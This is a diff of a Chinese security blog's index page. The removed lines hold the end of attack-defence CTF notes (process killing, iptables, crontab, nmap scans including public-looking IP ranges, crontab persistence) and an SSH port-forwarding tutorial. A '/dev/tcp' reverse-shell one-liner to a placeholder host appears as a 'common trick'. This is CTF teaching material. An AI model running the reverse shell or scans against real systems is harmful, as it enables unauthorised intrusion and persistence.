-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">结束进程</div><div class="line">- kill PID		  // 只能是PID</div><div class="line">- killall &lt;进程名&gt;  // 只能是进程名</div><div class="line">- kill -9 PID          // 此处的9是signal，代表SIGKILL</div><div class="line">- killall -u www-data   //杀死www-data的所有进程</div><div class="line"></div><div class="line">找反弹的shell进程</div><div class="line">ps aux|grep &quot;bash -i&quot;</div></pre></td></tr></table></figure>
-<h3 id="7、iptables设置"><a href="#7、iptables设置" class="headerlink" title="7、iptables设置"></a>7、iptables设置</h3><p>其实主办方一般不会给iptables的相关权限，毕竟给了这个权限之后就没法玩了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">#Allow youself Ping other hosts , prohibit others Ping you</div><div class="line">iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP</div><div class="line">iptables -A OUTPUT -p icmp --icmp-type 8 -s 0/0 -j ACCEPT</div><div class="line"></div><div class="line">#Close all INPUT FORWARD OUTPUT, just open some ports</div><div class="line">iptables -P INPUT DROP</div><div class="line">iptables -P FORWARD DROP</div><div class="line">iptables -P OUTPUT DROP</div><div class="line"></div><div class="line">#Open ssh</div><div class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</div><div class="line">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</div><div class="line"></div><div class="line">#ip prohibit</div><div class="line">iptables -A INPUT -p tcp --dport 80 -s 172.16.0.86 -j DROP</div></pre></td></tr></table></figure>
-<h3 id="8、crontab设置"><a href="#8、crontab设置" class="headerlink" title="8、crontab设置"></a>8、crontab设置</h3><p>作为维护者，为了方便自己定时检查数据内容，我们可以写个程序，利用crontab定时检查！</p>
-<p>作为攻击者，为了让维护者无法完全杀死自己，其可以起一个crontab定时程序，让服务器定时反弹shell或者执行木马程序。</p>
-<p>关于crontab的使用，可以参见以前的博文 <a href="/2017/11/26/crontab指令介绍/">crontab指令介绍</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">显示某个用户的crontab文件内容</div><div class="line">crontab -l -u user</div><div class="line"></div><div class="line">删除crontab内容</div><div class="line">crontab -r -u user</div></pre></td></tr></table></figure>
-<h3 id="9、挂waf的相关操作"><a href="#9、挂waf的相关操作" class="headerlink" title="9、挂waf的相关操作"></a>9、挂waf的相关操作</h3><p>一般情况下，系统不会立马被人攻陷，所以运维者至少有10分钟的时间可以维护主机。那么这段时间应该做些什么？</p>
-<blockquote>
-<p>首先将网站备份，并上传waf、file_check等必要工具；</p>
-<p>然后挂上waf。将waf放置到/tmp目录下，并给waf、waf/log/、waf/log_all/ 以及相应的文件777权限，然后配置好setup.py、waf.php，最后执行python setup.py；</p>
-<p>其次就是启动file_check程序。将file_check放置到/tmp目录下，配置file_check.py，执行python file_check.p；;</p>
-<p>最后将sql备份(不一定是必须的，因为sql不一定有。之所以将其放置到最后，是因为从代码中l找到sql密码较为耗时间！)，并将网站备份、sql备份下载至本地。</p>
-</blockquote>
-<h3 id="10、扫描网络"><a href="#10、扫描网络" class="headerlink" title="10、扫描网络"></a>10、扫描网络</h3><p>扫描网络在闲暇比赛中其实很重要。首先，你需要将目标网段确定，一般就是一个/24的网段，可能存在的服务器不会超过256台。但是，仅仅这个数量其实也挺多的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">#扫描指定端口</div><div class="line">nmap -n --open -p 80 X.X.X.X/24</div><div class="line"></div><div class="line">#扫描指定网段的远程桌面连接端口</div><div class="line">nmap -sT -p3389 218.206.112.0/24</div><div class="line"></div><div class="line">#使用nmap来扫描端口UDP</div><div class="line">nmap -sU 202.96.128.86 -p 53 -Pn</div><div class="line"></div><div class="line">#进行安全检测(全端口扫描)</div><div class="line">nmap -v -A 219.129.216.156</div><div class="line"></div><div class="line">#仅列出指定网络上的每台主机，不发送任何报文到目标主机（能够得到相应的域名）</div><div class="line">nmap -sL 192.168.1.0/24</div><div class="line"></div><div class="line">#探测目标主机开放的端口，可以指定一个以逗号分隔的端口列表(如-PS22，23，25，80)</div><div class="line">nmap -PS 192.168.1.234 </div><div class="line"></div><div class="line">#使用UDP ping探测主机</div><div class="line">nmap -PU 192.168.1.0/24</div><div class="line"></div><div class="line">#使用频率最高的扫描选项：SYN扫描,又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快</div><div class="line">nmap -sS 192.168.1.0/24 </div><div class="line"></div><div class="line">#当SYN扫描不能用时，TCP Connect()扫描就是默认的TCP扫描</div><div class="line">nmap -sT 192.168.1.0/24 </div><div class="line"></div><div class="line">#UDP扫描用-sU选项,UDP扫描发送空的(没有数据)UDP报头到每个目标端口</div><div class="line">nmap -sU 192.168.1.0/24 </div><div class="line"></div><div class="line">#确定目标机支持哪些IP协议 (TCP，ICMP，IGMP等)</div><div class="line">nmap -sO 192.168.1.19</div><div class="line"></div><div class="line">#探测目标主机的操作系统</div><div class="line">nmap -O 192.168.1.19 </div><div class="line">nmap -A 192.168.1.19 </div><div class="line"></div><div class="line">#进行ping扫描，打印出对扫描做出响应的主机,不做进一步测试(如端口扫描或者操作系统探测)</div><div class="line">nmap -sP 192.168.1.0/24</div></pre></td></tr></table></figure>
-<p>上述是基本操作，配合grep、awk可以得到更为玄妙的结果</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#扫描指定网段的指定端口，并输出至ip.data</div><div class="line">nmap -n --open -p 80 10.254.20.0/24 | grep -B3 &quot;80/tcp&quot;|grep &quot;report for&quot;|awk &apos;&#123;print $5&#125;&apos; &gt;&gt; ip.data</div></pre></td></tr></table></figure>
-<p>类似地，我们可以通过nmap的扫描结果，提取出需要的内容。</p>
-<h3 id="11、常用技巧"><a href="#11、常用技巧" class="headerlink" title="11、常用技巧"></a>11、常用技巧</h3><p>反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1</div></pre></td></tr></table></figure>
-<p>运行crontab</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">crontab cronfile</div></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/07/web/ssh端口转发/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Introspelliam">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/12/07/web/ssh端口转发/" itemprop="url">ssh端口转发</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-07T00:49:29+08:00">
-                2017-12-07
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="第一部分-概述"><a href="#第一部分-概述" class="headerlink" title="第一部分 概述"></a>第一部分 概述</h2><p>当你在咖啡馆享受免费 WiFi 的时候，有没有想到可能有人正在窃取你的密码及隐私信息？当你发现实验室的防火墙阻止了你的网络应用端口，是不是有苦难言？来看看 SSH 的端口转发功能能给我们带来什么好处吧！</p>
-<h3 id="端口转发概述"><a href="#端口转发概述" class="headerlink" title="端口转发概述"></a>端口转发概述</h3><p>让我们先来了解一下端口转发的概念吧。我们知道，SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH 还同时提供了一个非常有用的功能，这就是端口转发。它能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程有时也被叫做“隧道”（tunneling），这是因为 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输而得名。例如，Telnet，SMTP，LDAP 这些 TCP 应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果您工作环境中的防火墙限制了一些网络端口的使用，但是允许 SSH 的连接，那么也是能够通过将 TCP 端口转发来使用 SSH 进行通讯。总的来说 SSH 端口转发能够提供两大功能：</p>
-<ol>
-<li>加密 SSH Client 端至 SSH Server 端之间的通讯数据。</li>
-<li>突破防火墙的限制完成一些之前无法建立的 TCP 连接。</li>
-</ol>
-<p>图 1. SSH 端口转发</p>
-<p><img src="/images/2017-12-07/image001.jpg" alt=""></p>
-<p>如上图所示，使用了端口转发之后，TCP 端口 A 与 B 之间现在并不直接通讯，而是转发到了 SSH 客户端及服务端来通讯，从而自动实现了数据加密并同时绕过了防火墙的限制。</p>
-<h2 id="第二部分-本地转发与远程转发"><a href="#第二部分-本地转发与远程转发" class="headerlink" title="第二部分 本地转发与远程转发"></a>第二部分 本地转发与远程转发</h2><h3 id="本地转发实例分析"><a href="#本地转发实例分析" class="headerlink" title="本地转发实例分析"></a>本地转发实例分析</h3><p>我们先来看第一个例子，在实验室里有一台 LDAP 服务器（LdapServerHost），但是限制了只有本机上部署的应用才能直接连接此 LDAP 服务器。如果我们由于调试或者测试的需要想临时从远程机器（LdapClientHost）直接连接到这个 LDAP 服务器 , 有什么方法能够实现呢？</p>
-<p>答案无疑是本地端口转发了，它的命令格式是：</p>
-<p><code>ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></p>
-<p>在 LdapClientHost 上执行如下命令即可建立一个 SSH 的本地端口转发，例如：</p>
-<p><code>$ ssh -L 7001:localhost:389 LdapServerHost</code></p>
-<p>图 2. 本地端口转发</p>
-<p><img src="/images/2017-12-07/image002.jpg" alt=""></p>
-<p>这里需要注意的是本例中我们选择了 7001 端口作为本地的监听端口，在选择端口号时要注意非管理员帐号是无权绑定 1-1023 端口的，所以一般是选用一个 1024-65535 之间的并且尚未使用的端口号即可。</p>
-<p>然后我们可以将远程机器（LdapClientHost）上的应用直接配置到本机的 7001 端口上（而不是 LDAP 服务器的 389 端口上）。之后的数据流将会是下面这个样子：</p>
-<ul>
-<li>我们在 LdapClientHost 上的应用将数据发送到本机的 7001 端口上，</li>
-<li>而本机的 SSH Client 会将 7001 端口收到的数据加密并转发到 LdapServertHost 的 SSH Server 上。</li>
-<li>SSH Server 会解密收到的数据并将之转发到监听的 LDAP 389 端口上，</li>
-<li>最后再将从 LDAP 返回的数据原路返回以完成整个流程。</li>
-</ul>
-<p>我们可以看到，这整个流程应用并没有直接连接 LDAP 服务器，而是连接到了本地的一个监听端口，但是 SSH 端口转发完成了剩下的所有事情，加密，转发，解密，通讯。</p>
-<p>这里有几个地方需要注意：</p>
-<ol>
-<li>SSH 端口转发是通过 SSH 连接建立起来的，我们必须保持这个 SSH 连接以使端口转发保持生效。一旦关闭了此连接，相应的端口转发也会随之关闭。</li>
-<li>我们只能在建立 SSH 连接的同时创建端口转发，而不能给一个已经存在的 SSH 连接增加端口转发。</li>
-<li>你可能会疑惑上面命令中的 <code>&lt;remote host&gt;</code> 为什么用 localhost，它指向的是哪台机器呢？在本例中，它指向 LdapServertHost 。我们为什么用 localhost 而不是 IP 地址或者主机名呢？其实这个取决于我们之前是如何限制 LDAP 只有本机才能访问。如果只允许 lookback 接口访问的话，那么自然就只有 localhost 或者 IP 为 127.0.0.1 才能访问了，而不能用真实 IP 或者主机名。</li>
-<li>命令中的<code>&lt;remote host&gt;</code> 和 <code>&lt;SSH hostname&gt;</code> 必须是同一台机器么？其实是不一定的，它们可以是两台不同的机器。我们在后面的例子里会详细阐述这点。</li>
-<li>好了，我们已经在 LdapClientHost 建立了端口转发，那么这个端口转发可以被其他机器使用么？比如能否新增加一台 LdapClientHost2 来直接连接 LdapClientHost 的 7001 端口？答案是不行的，在主流 SSH 实现中，本地端口转发绑定的是 lookback 接口，这意味着只有 localhost 或者 127.0.0.1 才能使用本机的端口转发 , 其他机器发起的连接只会得到“ connection refused. ”。好在 SSH 同时提供了 GatewayPorts 关键字，我们可以通过指定它与其他机器共享这个本地端口转发。<br><code>ssh -g -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></li>
-</ol>
-<h3 id="远程转发实例分析"><a href="#远程转发实例分析" class="headerlink" title="远程转发实例分析"></a>远程转发实例分析</h3><p>我们来看第二个例子，这次假设由于网络或防火墙的原因我们不能用 SSH 直接从 LdapClientHost 连接到 LDAP 服务器（LdapServertHost），但是反向连接却是被允许的。那此时我们的选择自然就是远程端口转发了。</p>
-<p>它的命令格式是：</p>
-<p><code>ssh -R &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></p>
-<p>例如在 LDAP 服务器（LdapServertHost）端执行如下命令：</p>
-<p><code>$ ssh -R 7001:localhost:389 LdapClientHost</code></p>
-<p>图 3. 远程端口转发</p>
-<p><img src="/images/2017-12-07/image003.jpg" alt=""></p>
-<p>和本地端口转发相比，这次的图里，SSH Server 和 SSH Client 的位置对调了一下，但是数据流依然是一样的。我们在 LdapClientHost 上的应用将数据发送到本机的 7001 端口上，而本机的 SSH Server 会将 7001 端口收到的数据加密并转发到 LdapServertHost 的 SSH Client 上。 SSH Client 会解密收到的数据并将之转发到监听的 LDAP 389 端口上，最后再将从 LDAP 返回的数据原路返回以完成整个流程。</p>
-<p>看到这里，你是不是会有点糊涂了么？为什么叫本地转发，而有时又叫远程转发？这两者有什么区别？</p>
-<h3 id="本地转发与远程转发的对比与分析"><a href="#本地转发与远程转发的对比与分析" class="headerlink" title="本地转发与远程转发的对比与分析"></a>本地转发与远程转发的对比与分析</h3><p>不错，SSH Server，SSH Client，LdapServertHost，LdapClientHost，本地转发，远程转发，这么多的名词的确容易让人糊涂。让我们来分析一下其中的结构吧。首先，SSH 端口转发自然需要 SSH 连接，而 SSH 连接是有方向的，从 SSH Client 到 SSH Server 。而我们的应用也是有方向的，比如需要连接 LDAP Server 时，LDAP Server 自然就是 Server 端，我们应用连接的方向也是从应用的 Client 端连接到应用的 Server 端。如果这两个连接的方向一致，那我们就说它是本地转发。而如果两个方向不一致，我们就说它是远程转发。</p>
-<p>我们可以回忆上面的两个例子来做个对照。</p>
-<p>本地转发时：</p>
-<p>LdapClientHost 同时是应用的客户端，也是 SSH Client，这两个连接都从它指向 LdapServertHost（既是 LDAP 服务端，也是 SSH Server）。</p>
-<p>远程转发时：</p>
-<p>LdapClientHost 是应用的客户端，但却是 SSH Server ；而 LdapServertHost 是 LDAP 的服务端，但却是 SSH Client 。这样两个连接的方向刚好相反。</p>
-<p>另一个方便记忆的方法是，Server 端的端口都是预定义的固定端口（SSH Server 的端口 22，LDAP 的端口 389），而 Client 端的端口都是动态可供我们选择的端口（如上述例子中选用的 7001 端口）。如果 Server 端的两个端口都在同一台机器，Client 端的两个端口都在另一台机器上，那么这就是本地连接；如果这四个端口交叉分布在两个机器上，每台机器各有一个 Server 端端口，一个 Client 端端口，那就是远程连接。</p>
-<p>弄清楚了两者的区别之后，再来看看两者的相同之处。如果你所在的环境下，既允许 LdapClientHost 发起 SSH 连接到 LdapServerHost，也允许 LdapServerHost 发起 SSH 连接到 LdapClientHost 。那么这时我们选择本地转发或远程转发都是可以的，能完成一样的功能。</p>
-<p>接着让我们来看个进阶版的端口转发。我们之前涉及到的各种连接 / 转发都只涉及到了两台机器，还记得我们在本地转发中提到的一个问题么？本地转发命令中的 <code>&lt;remote host&gt;</code> 和 <code>&lt;SSH hostname&gt;</code> 可以是不同的机器么？</p>
-<p><code>ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></p>
-<p>答案是可以的！让我们来看一个涉及到四台机器 (A,B,C,D) 的例子。</p>
-<p>图 4. 多主机转发应用</p>
-<p><img src="/images/2017-12-07/image004.jpg" alt=""></p>
-<p>在 SSH Client(C) 执行下列命令来建立 SSH 连接以及端口转发：</p>
-<p><code>$ ssh -g -L 7001:&lt;B&gt;:389 &lt;D&gt;</code></p>
-<p>然后在我们的应用客户端（A）上配置连接机器（C ）的 7001 端口即可。注意我们在命令中指定了“ -g ”参数以保证机器（A）能够使用机器（C）建立的本地端口转发。而另一个值得注意的地方是，在上述连接中，（A）<code>&lt;-&gt;</code> (C) 以及 (B)<code>&lt;-&gt;</code>(D) 之间的连接并不是安全连接，它们之间没有经过 SSH 的加密及解密。如果他们之间的网络并不是值得信赖的网络连接，我们就需要谨慎使用这种连接方式了。</p>
-<h2 id="第三部分-其他类型的转发"><a href="#第三部分-其他类型的转发" class="headerlink" title="第三部分 其他类型的转发"></a>第三部分 其他类型的转发</h2><h3 id="动态转发实例分析"><a href="#动态转发实例分析" class="headerlink" title="动态转发实例分析"></a>动态转发实例分析</h3><p>恩，动态转发，听上去很酷。当你看到这里时，有没有想过我们已经讨论过了本地转发，远程转发，但是前提都是要求有一个固定的应用服务端的端口号，例如前面例子中的 LDAP 服务端的 389 端口。那如果没有这个端口号怎么办？等等，什么样的应用会没有这个端口号呢？嗯，比如说用浏览器进行 Web 浏览，比如说 MSN 等等。</p>
-<p>当我们在一个不安全的 WiFi 环境下上网，用 SSH 动态转发来保护我们的网页浏览及 MSN 信息无疑是十分必要的。让我们先来看一下动态转发的命令格式：</p>
-<p><code>$ ssh -D &lt;local port&gt; &lt;SSH Server&gt;</code></p>
-<p>例如：</p>
-<p><code>$ ssh -D 7001 &lt;SSH Server&gt;</code></p>
-<p>图 5. 动态端口转发</p>
-<p><img src="/images/2017-12-07/image005.jpg" alt=""></p>
-<p>似乎很简单，我们依然选择了 7001 作为本地的端口号，其实在这里 SSH 是创建了一个 SOCKS 代理服务。来看看帮助文档中对 -D 参数的描述：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-D port  This works by allocating a socket to listen to port on the local side, and whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine.  Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server.  Only root can forward privileged ports.  Dynamic port forwardings can also be specified in the configuration file.</div></pre></td></tr></table></figure>
-<p>之后的使用就简单了，我们可以直接使用 localhost:7001 来作为正常的 SOCKS 代理来使用，直接在浏览器或 MSN 上设置即可。在 SSH Client 端无法访问的网站现在也都可以正常浏览。而这里需要值得注意的是，此时 SSH 所包护的范围只包括从浏览器端（SSH Client 端）到 SSH Server 端的连接，并不包含从 SSH Server 端 到目标网站的连接。如果后半截连接的安全不能得到充分的保证的话，这种方式仍不是合适的解决方案。</p>
-<h3 id="X-协议转发实例分析"><a href="#X-协议转发实例分析" class="headerlink" title="X 协议转发实例分析"></a>X 协议转发实例分析</h3><p>好了，让我们来看最后一个例子 - X 协议转发。</p>
-<p>我们日常工作当中，可能会经常会远程登录到 Linux/Unix/Solaris/HP 等机器上去做一些开发或者维护，也经常需要以 GUI 方式运行一些程序，比如要求图形化界面来安装 DB2/WebSphere 等等。这时候通常有两种选择来实现：VNC 或者 X 窗口，让我们来看看后者。</p>
-<p>使用 X 窗口通常需要分别安装：X Client 和 X Server 。在本例中我们的 X Client 就是所访问的远程 Linux/Unix/Solaris/HP，而我们的 X Server 则是发起访问的本地机器（例如你面前正在使用的笔记本或台式机）。把 X Client 端的 X 窗口显示在 X Server 端需要先行在 X Client 端指定 X Server 的位置，命令格式如下：</p>
-<p><code>export DISPLAY=&lt;X Server IP&gt;:&lt;display #&gt;.&lt;virtual #&gt;</code></p>
-<p>例如：</p>
-<p><code>export DISPLAY=myDesktop:1.0</code></p>
-<p>然后直接运行 X 应用即可，X 窗口就会自动在我们的本地端打开。</p>
-<p>一切运行正常，但是，这时候 IT 部门突然在远程 Linux/Unix/Solaris/HP 前面加了一道防火墙。非常不幸的是，X 协议并不在允许通过的列表之内。怎么办？只能使用 VNC 了么？不，其实只要使用了 SSH 端口转发即可通过，同时也对 X 通讯数据做了加密，真是一举两得。（当然，使用此方法前最好先咨询相关 IT 部门是否符合相应的安全条例，以免造成违规操作。）</p>
-<p>建立命令也很简单，直接从本地机器（X Server 端）发起一个如下的 SSH 连接即可：</p>
-<p><code>$ ssh -X &lt;SSH Server&gt;</code></p>
-<p>图 6. X 转发</p>
-<p><img src="/images/2017-12-07/image006.jpg" alt=""></p>
-<p>建立连接之后就可以直接运行远程的 X 应用。注意建立 X 转发之后会自动设置 DISPLAY 环境变量，通常会被设置成<code>localhost:10.0</code>，我们无需也不应该在连接之后再进行修改此环境变量。</p>
-<p>一个比较常见的场景是，我们的本地机器是 Windows 操作系统，这时可以选择开源的 XMing 来作为我们的 XServer，而 SSH Client 则可以任意选择了，例如 PuTTY，Cygwin 均可以配置 访问 SSH 的同时建立 X 转发。</p>
-<h2 id="第四部分-总结"><a href="#第四部分-总结" class="headerlink" title="第四部分 总结"></a>第四部分 总结</h2><p>至此，我们已经完成了本地端口转发，远程端口转发，动态端口转发以及 X 转发的介绍。回顾起来，总的思路是通过将 TCP 连接转发到 SSH 通道上以解决数据加密以及突破防火墙的种种限制。对一些已知端口号的应用，例如 Telnet/LDAP/SMTP，我们可以使用本地端口转发或者远程端口转发来达到目的。动态端口转发则可以实现 SOCKS 代理从而加密以及突破防火墙对 Web 浏览的限制。对于 X 应用，无疑是 X 转发最为适用了。虽然每一部分我们都只是简单的介绍了一下，但如果能灵活应用这些技巧，相信对我们的日常生活 / 工作也是会有所帮助的。</p>
-
-          
+          0x01 前言IDA之于逆向人员、PWN手的重要性几乎等同于左右手之于人。所以学好IDA是我们关键的一步。
+0x02 基本快捷键2.1 View2.2 Jump
+Esc   jump to previous position
+Ctrl+Enter  jump to next postion
+
+0x0
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/08/pwn/IDA使用指南/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2237,7 +1074,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/25/">25</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2298,7 +1135,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">17</span>
+                <span class="site-state-item-count">12</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -2309,7 +1146,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">56</span>
+                <span class="site-state-item-count">55</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
